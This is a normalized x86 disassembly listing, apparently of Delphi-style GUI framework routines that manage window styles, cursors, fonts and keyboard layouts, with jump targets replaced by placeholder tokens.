mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_41a468
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44f020
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45f894
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45f840
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403430
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f910
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_420eb8
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45f94c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_44309c
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_443d6c
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45f994
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4496dc
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4493d8
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_4493d8
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4493d8
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4493d8
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4493d8
push eax
call RedrawWindow
sub_45fae8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_45a898
mov dl 0x5
mov eax ebx
call sub_45c60c
mov dl 0x1
mov eax ebx
call sub_447f7c
mov dl 0x3
mov eax ebx
call sub_45c908
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_45fb50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45fc27
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_447e3c
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_447ca8
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_4420cc
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_442b2c
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4040f8
mov eax [ ebp - 0xc ]
call sub_4042c8
push eax
mov eax [ ebp - 0xc ]
call sub_4044c8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_442b3c
mov eax [ ebp - 0xc ]
call sub_4042c8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fc2e
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov dl 0x1
mov eax esi
call sub_45bc8c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_442be8
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404654
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45fc54
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4460d0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_45b3b0
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_446094
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403430
inc ebp
dec edi
jne r-xdata
sub_45fca0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_447e3c
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45fccc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448644
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45fcf4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45e05c
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4493d8
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_447e3c
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4493d8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4493d8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_447e50
or ecx 0xffffffff
mov dl 0x1
call sub_443260
pop esi
pop ebx
retn
sub_45fd8c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_448ab4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_443d6c
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_442558
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403430
sub_45fde4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45feaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_442b2c
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4040f8
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_442b3c
mov eax [ ebp - 0x4 ]
call sub_4042c8
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_442be8
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45feb1
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_45bc8c
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404654
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45fed0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_448834
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_447e3c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_447e50
mov dl [ ebx + 0x57 ]
call sub_442ad8
inc edi
dec esi
jne r-xdata
sub_45ff74
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45ffa4
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45ffd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_460378
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_460384
mov eax ebx
call sub_460390
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_45c7ac
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238d0
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238d0
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238d0
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_4607b0
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46068c
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46068c
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46068c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46012c
push ebx
push esi
push edi
push ebp
call sub_4035c0
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403234
mov eax [ ebp + 0x88 ]
call sub_403234
mov eax [ ebp + 0x84 ]
call sub_403234
mov eax [ ebp + 0x54 ]
call sub_403234
mov eax [ ebp + 0x50 ]
call sub_403234
mov eax [ ebp + 0x4c ]
call sub_403234
mov eax [ ebp + 0x30 ]
call sub_403234
mov eax [ ebp + 0x34 ]
call sub_403234
mov eax [ ebp + 0x7c ]
call sub_403234
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403234
mov eax ebp
call sub_4603ec
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_420760
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035a8
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_41a468
call sub_403234
inc edi
dec esi
jne r-xdata
sub_4602a4
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4602f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a30c
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a30c
mov eax [ rw-data ]
call sub_463124
sub_460328
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a604
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a604
mov eax [ rw-data ]
call sub_463124
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_44a990
sub_460390
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_460448
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_4603ec
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4027bc
mov ebx esi
test ebx ebx
jne r-xdata
sub_460448
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_40279c
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_460470
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46061b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460622
lea eax [ ebp - 0x260 ]
call sub_404008
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404008
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41c3fc
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408fdc
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44e0f4
test al al
je r-xdata
xor eax eax
push ebp
push sub_4605d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404278
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404278
sub_46068c
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_462f94
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_462d48
mov dl 0x1
mov eax [ rw-data ]
call sub_462d48
sub_4606f8
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_460720
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_4606f8
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406dec
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406d74
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4607b0
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4608f5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_462d48
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423c60
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423c60
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_423d44
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423c60
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_423c60
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423c60
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_462d48
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_423aa4
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_423aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4608fc
cmp [ rw-data ] 0x0
je r-xdata
sub_460934
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_460994
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_460ad0 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_460b44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46029c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
